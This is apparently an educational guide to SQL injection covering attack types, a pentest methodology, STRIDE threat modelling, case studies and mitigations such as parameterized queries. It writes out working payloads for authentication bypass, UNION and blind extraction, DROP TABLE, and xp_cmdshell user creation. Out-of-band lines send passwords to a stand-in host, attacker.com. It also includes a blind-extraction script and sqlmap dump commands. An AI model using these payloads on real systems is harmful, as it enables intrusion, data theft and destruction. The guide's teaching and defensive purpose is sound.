# SQL Injection - Comprehensive Guide

## At a glance

**SQL injection** interferes with **database queries** by injecting attacker-controlled SQL fragments—often bypassing auth, **exfiltrating** data, or **writing** files depending on DB privileges. **Parameterized queries / prepared statements** are the primary **fix**; **ORMs** help but don’t eliminate **unsafe** dynamic SQL. **Second-order** and **blind** SQLi are common **senior** follow-ups.

---

## Learning outcomes

- Explain how injection arises in **string concatenation** vs **parameters**.
- Describe **boolean**, **time-based**, and **union** techniques at a high level.
- Map defenses: **prepared statements**, **least-privilege** DB users, **WAF** as secondary.

---

## Prerequisites

Web app architecture basics, OWASP Injection category (this repo).

---

## **Introduction**

SQL Injection (SQLi) is one of the most critical and prevalent web application vulnerabilities. It ranks #3 in the OWASP Top 10 2021 and has been a persistent threat since the early days of web applications.

### **What SQL Injection is Used For**

SQL Injection attacks are used by attackers to:

- **Bypass authentication** mechanisms
- **Extract sensitive data** from databases
- **Modify or delete data** in databases
- **Execute arbitrary commands** on database servers
- **Perform privilege escalation**
- **Access internal network resources** (in some cases)

### **Why SQL Injection is Dangerous**

**Severity:**

- ✅ **High Impact**: Can lead to complete database compromise
- ✅ **Common**: Found in many applications
- ✅ **Easy to Exploit**: Basic attacks require minimal technical skill
- ✅ **Hard to Detect**: May not show obvious errors
- ✅ **Persistent**: Still prevalent despite awareness

---

## **What is SQL Injection**

SQL Injection is a code injection technique that exploits security vulnerabilities in an application's database layer. It occurs when user-supplied input is not properly validated, sanitized, or parameterized before being used in SQL queries.

### **Basic Example**

**Vulnerable Code:**

```python
username = request.form['username']
password = request.form['password']

query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
result = db.execute(query)

```

**Attack:**

```
Username: admin'--
Password: (anything)

```

**Resulting Query:**

```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = ''

```

The `--` comments out the password check, allowing login without a password!

---

## **Types of SQL Injection**

### **1. Classic/In-Band SQL Injection**

**Description:** The attacker receives the results directly in the application's response.

**Subtypes:**

### **a) Error-Based SQL Injection**

- Exploits database error messages
- Errors reveal database structure
- Example: `' OR 1=1--`

### **b) Union-Based SQL Injection**

- Uses `UNION` to combine queries
- Extracts data from other tables
- Example: `' UNION SELECT username, password FROM users--`

### **2. Blind SQL Injection**

**Description:** The attacker doesn't see direct results but infers information from application behavior.

**Subtypes:**

### **a) Boolean-Based Blind**

- Uses true/false conditions
- Observes different responses
- Example: `' AND 1=1--` vs `' AND 1=2--`

### **b) Time-Based Blind**

- Uses time delays to infer data
- Example: `'; WAITFOR DELAY '00:00:05'--`

### **3. Second-Order SQL Injection**

**Description:** Malicious input is stored and executed later when used in another query.

**Example:**

```python
# First query (stored)
username = "admin'--"
db.execute(f"INSERT INTO users (username) VALUES ('{username}')")

# Second query (executed later)
user = db.execute(f"SELECT * FROM users WHERE username = '{username}'")
# Executes: SELECT * FROM users WHERE username = 'admin'--'

```

### **4. Out-of-Band SQL Injection**

**Description:** Uses alternative channels (DNS, HTTP) to extract data.

**Example:**

```sql
'; EXEC xp_cmdshell('nslookup attacker.com')--

```

---

## **How SQL Injection Works**

### **Step-by-Step Attack Process**

1. **Identify Input Points:**
    - URL parameters
    - Form fields
    - HTTP headers
    - Cookies
2. **Test for Vulnerability:**
    
    ```sql
    -- Test basic injection
    ' OR '1'='1
    
    -- Test for errors
    '
    
    -- Test for blind injection
    ' AND 1=1--
    ' AND 1=2--
    
    ```
    
3. **Determine Database Type:**
    
    ```sql
    -- MySQL
    SELECT @@version
    
    -- MSSQL
    SELECT @@version
    
    -- PostgreSQL
    SELECT version()
    
    ```
    
4. **Extract Database Schema:**
    
    ```sql
    -- MySQL
    SELECT table_name FROM information_schema.tables
    
    -- MSSQL
    SELECT name FROM sysobjects WHERE xtype='U'
    
    ```
    
5. **Extract Data:**
    
    ```sql
    UNION SELECT username, password FROM users--
    
    ```
    

### **Vulnerable Code Patterns**

**Pattern 1: String Concatenation**

```python
# ❌ VULNERABLE
query = "SELECT * FROM users WHERE username = '" + username + "'"

```

**Pattern 2: String Formatting**

```python
# ❌ VULNERABLE
query = f"SELECT * FROM users WHERE username = '{username}'"

```

**Pattern 3: Template Literals**

```jsx
// ❌ VULNERABLE
const query = `SELECT * FROM users WHERE username = '${username}'`

```

**Pattern 4: Dynamic Query Building**

```python
# ❌ VULNERABLE
query = "SELECT * FROM users WHERE 1=1"
if username:
    query += f" AND username = '{username}'"

```

---

## **Impact of SQL Injection**

### **1. Data Breach**

**Confidentiality Impact:**

- Extract all user data
- Access sensitive information
- Read configuration files
- Access encrypted data

**Example:**

```sql
' UNION SELECT credit_card, ssn FROM customers--

```

### **2. Authentication Bypass**

**Impact:**

- Login without credentials
- Access any user account
- Escalate privileges

**Example:**

```sql
-- Username: admin'--
-- Password: (anything)
SELECT * FROM users WHERE username = 'admin'--' AND password = ''

```

### **3. Data Manipulation**

**Integrity Impact:**

- Modify user data
- Change prices
- Alter records
- Delete data

**Example:**

```sql
'; UPDATE users SET role = 'admin' WHERE username = 'attacker'--

```

### **4. Data Deletion**

**Availability Impact:**

- Delete entire tables
- Drop databases
- Truncate data

**Example:**

```sql
'; DROP TABLE users--

```

### **5. Remote Code Execution**

**Severity: Critical**

- Execute OS commands
- Access file system
- Install backdoors
- Pivot to other systems

**Example (MSSQL):**

```sql
'; EXEC xp_cmdshell('net user hacker P@ssw0rd /add')--

```

### **6. Server Compromise**

**Impact:**

- Complete system control
- Access internal network
- Install persistent access
- Use as attack platform

---

## **Common Attack Techniques**

### **1. Authentication Bypass**

**Payload:**

```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
' OR 1=1--
' OR 1=1#
' OR 1=1/*

```

### **2. Union-Based Data Extraction**

**Payload:**

```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT username, password FROM users--
' UNION SELECT 1,2,3,4,5--

```

### **3. Boolean-Based Blind**

**Payload:**

```sql
' AND 1=1--
' AND 1=2--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--

```

### **4. Time-Based Blind**

**Payload:**

```sql
'; WAITFOR DELAY '00:00:05'--
'; SELECT SLEEP(5)--
'; pg_sleep(5)--

```

### **5. Error-Based**

**Payload:**

```sql
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

```

### **6. Second-Order**

**Payload:**

```sql
-- Stored in database
admin'--

-- Executed later
SELECT * FROM users WHERE username = 'admin'--'

```

---

## **Mitigation Strategies**

### **1. Parameterized Queries (Prepared Statements)**

**✅ CORRECT:**

```python
# Python (using parameterized queries)
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))

```

```java
// Java (using PreparedStatement)
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();

```

```jsx
// Node.js (using parameterized queries)
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.query(query, [username, password], (err, results) => {
  // Handle results
});

```

### **2. Input Validation**

**✅ CORRECT:**

```python
import re

def validate_username(username):
    # Whitelist approach
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username")
    return username

```

### **3. Least Privilege**

**✅ CORRECT:**

```sql
-- Database user with minimal privileges
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON app_db.users TO 'app_user'@'localhost';
-- No DROP, ALTER, or EXECUTE privileges

```

### **4. Output Encoding**

**✅ CORRECT:**

```python
# Encode output to prevent XSS (secondary protection)
from html import escape

user_input = escape(user_input)

```

### **5. WAF (Web Application Firewall)**

**✅ CORRECT:**

- Deploy WAF as additional layer
- Configure SQL injection rules
- Monitor and alert on attacks
- **Note:** WAF is not a substitute for secure coding

---

## **Best Practices**

### **1. Always Use Parameterized Queries**

**Rule:** Never concatenate user input into SQL queries.

**❌ WRONG:**

```python
query = f"SELECT * FROM users WHERE username = '{username}'"

```

**✅ CORRECT:**

```python
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))

```

### **2. Validate Input**

**Rule:** Validate all user input before using it.

**✅ CORRECT:**

```python
def validate_input(input_value, input_type):
    if input_type == 'username':
        if not re.match(r'^[a-zA-Z0-9_]{3,20}$', input_value):
            raise ValueError("Invalid username")
    elif input_type == 'email':
        if not re.match(r'^[^@]+@[^@]+\.[^@]+$', input_value):
            raise ValueError("Invalid email")
    return input_value

```

### **3. Use Least Privilege**

**Rule:** Database users should have minimal required privileges.

**✅ CORRECT:**

```sql
-- Application user
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';

-- Admin operations (separate user)
GRANT ALL PRIVILEGES ON app_db.* TO 'admin_user'@'localhost';

```

### **4. Error Handling**

**Rule:** Don't expose database errors to users.

**❌ WRONG:**

```python
try:
    cursor.execute(query)
except Exception as e:
    return f"Database error: {str(e)}"  # Exposes database structure

```

**✅ CORRECT:**

```python
try:
    cursor.execute(query)
except Exception as e:
    logger.error(f"Database error: {str(e)}")
    return "An error occurred. Please try again."

```

### **5. Regular Security Testing**

**Rule:** Test for SQL injection regularly.

**✅ CORRECT:**

- Code reviews
- Penetration testing
- SAST/DAST scanning
- Bug bounty programs

---

## **Advanced Exploitation Techniques**

### **1. Advanced Union-Based Extraction**

**Technique:**

```sql
-- Determine column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- Continue until error

-- Extract data
' UNION SELECT NULL, NULL, NULL--
' UNION SELECT username, password, email FROM users--

```

**Real-World Example:**

```sql
-- Extract database version
' UNION SELECT NULL, @@version, NULL--

-- Extract table names
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--

-- Extract column names
' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract data
' UNION SELECT NULL, username, password FROM users--

```

### **2. Time-Based Blind Extraction**

**Technique:**

```sql
-- Test if first character is 'a'
' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97, SLEEP(5), 0)--

-- Extract character by character
' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>64, SLEEP(5), 0)--
' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))<91, SLEEP(5), 0)--

```

**Automated Script:**

```python
import requests
import time

def extract_char(position):
    for char_code in range(32, 127):
        payload = f"' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),{position},1))={char_code}, SLEEP(5), 0)--"
        start = time.time()
        requests.get(f"http://target.com/search?q={payload}")
        elapsed = time.time() - start
        if elapsed > 4:
            return chr(char_code)
    return None

```

### **3. Second-Order SQL Injection**

**Attack Scenario:**

**Step 1: Register Malicious Username**

```sql
-- Registration
INSERT INTO users (username, password) VALUES ('admin''--', 'password')
-- Stored as: admin'--

```

**Step 2: Exploit During Login**

```sql
-- Login query
SELECT * FROM users WHERE username = 'admin'--' AND password = 'password'
-- Executes: SELECT * FROM users WHERE username = 'admin'--'
-- Bypasses password check!

```

### **4. Out-of-Band Data Exfiltration**

**Technique:**

```sql
-- MSSQL: DNS exfiltration
'; EXEC xp_cmdshell('nslookup ' + (SELECT password FROM users WHERE id=1) + '.attacker.com')--

-- MySQL: HTTP exfiltration
' UNION SELECT NULL, LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE id=1), '.attacker.com\\test.txt'))--

```

### **5. Stacked Queries**

**Technique:**

```sql
-- Execute multiple queries
'; DROP TABLE users; SELECT * FROM logs--

```

**Note:** Not all databases/drivers support stacked queries.

### **6. Boolean-Based Blind with Subqueries**

**Technique:**

```sql
-- Test if user exists
' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--

-- Test password length
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>10--

-- Extract character by character
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--

```

---

## **Penetration Testing Methodology**

### **SQL Injection Testing Checklist**

**1. Reconnaissance:**

```bash
# Identify input points
- URL parameters
- POST data
- HTTP headers
- Cookies
- File uploads

```

**2. Vulnerability Detection:**

```bash
# Test basic injection
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
' OR 1=1#

# Test for errors
'
"
`

```

**3. Database Fingerprinting:**

```sql
-- MySQL
' AND @@version LIKE 'MySQL%'--

-- MSSQL
' AND @@version LIKE 'Microsoft%'--

-- PostgreSQL
' AND version() LIKE 'PostgreSQL%'--

```

**4. Schema Enumeration:**

```sql
-- MySQL: List tables
' UNION SELECT table_name FROM information_schema.tables--

-- MSSQL: List tables
' UNION SELECT name FROM sysobjects WHERE xtype='U'--

-- PostgreSQL: List tables
' UNION SELECT tablename FROM pg_tables--

```

**5. Data Extraction:**

```sql
-- Extract column names
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Extract data
' UNION SELECT username, password FROM users--

```

### **Testing Tools**

**1. SQLMap:**

```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1" --dbs

# Extract data
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# Advanced options
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --tamper=space2comment

```

**2. Burp Suite:**

- SQL injection scanner
- Manual testing
- Intruder for fuzzing
- Repeater for payload testing

**3. Custom Scripts:**

```python
import requests

payloads = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' UNION SELECT NULL--",
    "'; WAITFOR DELAY '00:00:05'--"
]

for payload in payloads:
    response = requests.get(f"http://target.com/search?q={payload}")
    if "error" in response.text.lower() or response.elapsed.total_seconds() > 4:
        print(f"Potential SQLi: {payload}")

```

### **Common Findings in Penetration Tests**

**1. Direct SQL Injection:**

- **Finding**: User input directly concatenated into SQL
- **Risk**: Critical
- **Evidence**: `' OR '1'='1` bypasses authentication

**2. Second-Order SQL Injection:**

- **Finding**: Stored input executed later
- **Risk**: High
- **Evidence**: Malicious username stored, exploited during login

**3. Blind SQL Injection:**

- **Finding**: Time-based or boolean-based injection
- **Risk**: High
- **Evidence**: Delayed responses or different behaviors

**4. No Input Validation:**

- **Finding**: No validation on user input
- **Risk**: High
- **Evidence**: Special characters accepted without sanitization

**5. Error Message Disclosure:**

- **Finding**: Database errors exposed to users
- **Risk**: Medium
- **Evidence**: Full SQL errors visible in responses

---

## **Threat Modeling (STRIDE Framework)**

### **Spoofing**

**Threat:** Attacker impersonates legitimate users via SQL injection.

**Attack Vectors:**

- Authentication bypass
- Session hijacking via SQL injection
- Privilege escalation

**Mitigation:**

- Parameterized queries
- Input validation
- Proper authentication

**Risk Rating:** High

### **Tampering**

**Threat:** Attacker modifies data via SQL injection.

**Attack Vectors:**

- UPDATE statements
- DELETE statements
- Data manipulation

**Mitigation:**

- Parameterized queries
- Least privilege
- Audit logging

**Risk Rating:** High

### **Repudiation**

**Threat:** Attacker denies actions (no audit trail).

**Attack Vectors:**

- Delete audit logs
- Modify timestamps
- Bypass logging

**Mitigation:**

- Immutable audit logs
- Database triggers
- External logging

**Risk Rating:** Medium

### **Information Disclosure**

**Threat:** Attacker extracts sensitive data.

**Attack Vectors:**

- SELECT statements
- UNION-based extraction
- Error-based disclosure

**Mitigation:**

- Parameterized queries
- Error handling
- Data encryption

**Risk Rating:** Critical

### **Denial of Service**

**Threat:** Attacker causes service disruption.

**Attack Vectors:**

- Heavy queries
- DROP statements
- Resource exhaustion

**Mitigation:**

- Query timeouts
- Resource limits
- Input validation

**Risk Rating:** High

### **Elevation of Privilege**

**Threat:** Attacker gains unauthorized access.

**Attack Vectors:**

- Authentication bypass
- Privilege escalation
- Admin access

**Mitigation:**

- Parameterized queries
- Least privilege
- Access controls

**Risk Rating:** Critical

### **Attack Tree: SQL Injection Data Extraction**

```
SQL Injection Data Extraction
├── Authentication Bypass
│   ├── Login form injection
│   ├── Session manipulation
│   └── Privilege escalation
├── Direct Data Extraction
│   ├── Union-based
│   ├── Error-based
│   └── Stacked queries
├── Blind Data Extraction
│   ├── Boolean-based
│   ├── Time-based
│   └── Out-of-band
└── Second-Order
    ├── Stored injection
    └── Delayed execution

```

---

## **Real-World Case Studies**

### **Case Study 1: Authentication Bypass in E-Commerce Platform**

**Background:** During a penetration test of an e-commerce platform, we discovered a critical SQL injection vulnerability in the login functionality.

**Discovery:**

```python
# Vulnerable code
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

```

**Exploitation:**

```sql
-- Username: admin'--
-- Password: (anything)
-- Resulting query:
SELECT * FROM users WHERE username = 'admin'--' AND password = ''
-- Bypasses password check!

```

**Impact:**

- **Confidentiality**: Critical - Access to all user accounts
- **Integrity**: Critical - Ability to modify orders, prices
- **Availability**: High - Could delete user accounts
- **Business Impact**: Critical - Complete platform compromise

**Root Cause:**

- Direct string concatenation
- No input validation
- No parameterized queries

**Remediation:**

```python
# Fixed code
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))

```

**Lessons Learned:**

- Always use parameterized queries
- Never trust user input
- Implement defense in depth

---

### **Case Study 2: Union-Based Data Extraction**

**Background:** Security assessment revealed SQL injection in search functionality.

**Discovery:**

```python
# Vulnerable code
search_term = request.args.get('q')
query = f"SELECT * FROM products WHERE name LIKE '%{search_term}%'"

```

**Exploitation:**

```sql
-- Payload: ' UNION SELECT username, password, email FROM users--
-- Resulting query:
SELECT * FROM products WHERE name LIKE '%' UNION SELECT username, password, email FROM users--%'
-- Extracts all user credentials!

```

**Impact:**

- **Confidentiality**: Critical - All user passwords exposed
- **Integrity**: High - Could modify user data
- **Business Impact**: Critical - GDPR violation, data breach

**Root Cause:**

- No input validation
- No output encoding
- No parameterized queries

**Remediation:**

```python
# Fixed code
query = "SELECT * FROM products WHERE name LIKE ?"
search_pattern = f"%{search_term}%"
cursor.execute(query, (search_pattern,))

```

---

### **Case Study 3: Time-Based Blind SQL Injection**

**Background:** Application showed no errors but was vulnerable to blind SQL injection.

**Discovery:**

```python
# Vulnerable code
user_id = request.args.get('id')
query = f"SELECT * FROM users WHERE id = {user_id}"

```

**Exploitation:**

```sql
-- Test payload: 1 AND IF(1=1, SLEEP(5), 0)--
-- Response delayed by 5 seconds
-- Confirms SQL injection vulnerability

-- Extract data character by character
1 AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97, SLEEP(5), 0)--

```

**Impact:**

- **Confidentiality**: Critical - Slow but complete data extraction
- **Business Impact**: High - Persistent data breach

**Root Cause:**

- No input validation
- No parameterized queries
- No query timeouts

**Remediation:**

```python
# Fixed code
query = "SELECT * FROM users WHERE id = ?"
cursor.execute(query, (user_id,))

```

---

## **Advanced Mitigations**

### **Defense in Depth Strategy**

**Layer 1: Input Validation**

```python
import re

def validate_user_input(input_value, input_type):
    if input_type == 'id':
        if not re.match(r'^\d+$', str(input_value)):
            raise ValueError("Invalid ID")
        return int(input_value)
    elif input_type == 'username':
        if not re.match(r'^[a-zA-Z0-9_]{3,20}$', input_value):
            raise ValueError("Invalid username")
        return input_value
    return input_value

```

**Layer 2: Parameterized Queries**

```python
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))

```

**Layer 3: Least Privilege**

```sql
-- Application user with minimal privileges
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';
-- No DROP, ALTER, or EXECUTE privileges

```

**Layer 4: Error Handling**

```python
try:
    cursor.execute(query, params)
except DatabaseError as e:
    logger.error(f"Database error: {str(e)}")
    # Don't expose error details to user
    raise ApplicationError("An error occurred")

```

**Layer 5: Monitoring**

```python
# Log suspicious patterns
if re.search(r"[';--]", user_input):
    logger.warning(f"Potential SQL injection attempt: {user_input}")
    alert_security_team(user_input, request.ip)

```

### **Query Timeouts**

**Implementation:**

```python
import signal

def execute_with_timeout(query, params, timeout=5):
    def timeout_handler(signum, frame):
        raise TimeoutError("Query timeout")

    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(timeout)
    try:
        result = cursor.execute(query, params)
        signal.alarm(0)
        return result
    except TimeoutError:
        logger.error("Query timeout - potential attack")
        raise

```

### **Input Sanitization (Secondary Defense)**

**Implementation:**

```python
def sanitize_input(input_value):
    # Remove SQL keywords (not primary defense!)
    sql_keywords = ['SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'UNION']
    for keyword in sql_keywords:
        input_value = input_value.replace(keyword, '')
    return input_value

# Note: This is NOT sufficient alone - use parameterized queries!

```

---

## **SAST/DAST Detection**

### **SAST (Static Application Security Testing)**

**Vulnerable Code Patterns:**

**1. String Concatenation:**

```python
# ❌ VULNERABLE
query = "SELECT * FROM users WHERE username = '" + username + "'"

# SAST Detection:
# - Pattern: String concatenation with user input
# - Severity: High
# - CWE: CWE-89 (SQL Injection)

```

**2. String Formatting:**

```python
# ❌ VULNERABLE
query = f"SELECT * FROM users WHERE username = '{username}'"

# SAST Detection:
# - Pattern: f-string with user input in SQL
# - Severity: High
# - CWE: CWE-89

```

**3. Dynamic Query Building:**

```python
# ❌ VULNERABLE
query = "SELECT * FROM users WHERE 1=1"
if username:
    query += f" AND username = '{username}'"

# SAST Detection:
# - Pattern: Dynamic query building with user input
# - Severity: High
# - CWE: CWE-89

```

**4. No Parameterized Queries:**

```python
# ❌ VULNERABLE
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")

# SAST Detection:
# - Pattern: execute() with string formatting
# - Severity: High
# - CWE: CWE-89

```

### **DAST (Dynamic Application Security Testing)**

**Testing Methodology:**

**1. Basic Injection Testing:**

```bash
# Test basic payloads
sqlmap -u "http://target.com/page?id=1" --dbs

# Manual testing
curl "http://target.com/page?id=1' OR '1'='1"

```

**2. Error-Based Testing:**

```bash
# Trigger errors
curl "http://target.com/page?id=1'"

# Analyze error messages
# Look for database errors, stack traces

```

**3. Blind Injection Testing:**

```bash
# Time-based
sqlmap -u "http://target.com/page?id=1" --technique=T

# Boolean-based
sqlmap -u "http://target.com/page?id=1" --technique=B

```

**4. Union-Based Testing:**

```bash
# Union extraction
sqlmap -u "http://target.com/page?id=1" --technique=U --dump

```

**Common DAST Findings:**

- Direct SQL injection in login forms
- Union-based injection in search
- Blind SQL injection in filters
- Second-order injection in registration
- Error message disclosure

---

## **Risk Assessment**

### **Risk Matrix**

| Vulnerability | Likelihood | Impact | Risk Level | Business Impact |
| --- | --- | --- | --- | --- |
| **Authentication Bypass** | High | Critical | **Critical** | Complete system compromise |
| **Data Extraction** | High | Critical | **Critical** | Data breach, GDPR violation |
| **Data Manipulation** | Medium | High | **High** | Data integrity compromise |
| **Remote Code Execution** | Low | Critical | **High** | Server compromise |
| **Denial of Service** | Medium | Medium | **Medium** | Service disruption |

### **Risk Calculation**

**Formula:**

```
Risk = Likelihood × Impact

```

**Example: Authentication Bypass**

**Likelihood:** High (0.8)

- Common vulnerability
- Easy to exploit
- Often found in login forms

**Impact:** Critical (1.0)

- Complete system access
- All user accounts compromised
- Data breach

**Risk Score:** 0.8 × 1.0 = **0.8 (Critical Risk)**

**Business Impact:**

- **Financial**: Data breach fines (GDPR: up to 4% revenue)
- **Reputation**: Loss of customer trust
- **Operational**: System downtime, incident response
- **Legal**: Regulatory compliance violations

### **Risk Prioritization**

**Critical (Immediate Action):**

- Authentication bypass
- Data extraction
- Remote code execution

**High (Urgent Action):**

- Data manipulation
- Privilege escalation
- Second-order injection

**Medium (Planned Action):**

- Error message disclosure
- Information leakage
- Denial of service

---

## **Summary**

SQL Injection remains one of the most critical web application vulnerabilities. Key points to remember:

1. **Always use parameterized queries** - Never concatenate user input
2. **Validate all input** - Whitelist approach preferred
3. **Use least privilege** - Database users with minimal permissions
4. **Handle errors properly** - Don't expose database details
5. **Test regularly** - Code reviews, penetration testing, scanning
6. **Implement defense in depth** - Multiple layers of protection
7. **Monitor for attacks** - Log and alert on suspicious patterns
8. **Keep systems updated** - Patch databases and frameworks
9. **Train developers** - Security awareness and secure coding
10. **Follow security standards** - OWASP guidelines and best practices

Remember: **SQL Injection is prevented by parameterized queries (prepared statements), not by input validation or WAFs alone!**

---

## Interview clusters

- **Fundamentals:** “Parameterized query vs escaping?” “Second-order SQLi?”
- **Senior:** “ORM still SQLi—how?” “Blind SQLi detection in logs?”
- **Staff:** “Secure multi-tenant DB access pattern for SaaS.”

---

## Cross-links

Parameterized Queries topic, OWASP Injection, Secure Source Code Review, IDOR (often paired in APIs).
